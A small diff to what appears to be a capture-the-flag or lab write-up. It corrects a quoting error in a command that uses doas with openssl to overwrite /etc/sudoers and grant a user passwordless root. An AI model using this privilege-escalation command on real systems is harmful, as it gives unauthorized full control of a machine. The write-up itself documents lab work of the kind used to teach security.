@@ -141,7 +141,7 @@ We'll add a line for our user there at the end. And save it on our attacker PC a
 
 Now let's overwrite the file on the server to give us the privileges.
 
-```echo "plot_admin ALL=(ALL) NOPASSWD:ALL | doas openssl enc -out /etc/sudoers```
+```echo "plot_admin ALL=(ALL) NOPASSWD:ALL" | doas openssl enc -out /etc/sudoers```
 
 <img width="816" height="266" alt="image" src="https://github.com/user-attachments/assets/cc3bb913-be13-48a9-86c4-bb3c0e464587" />
 
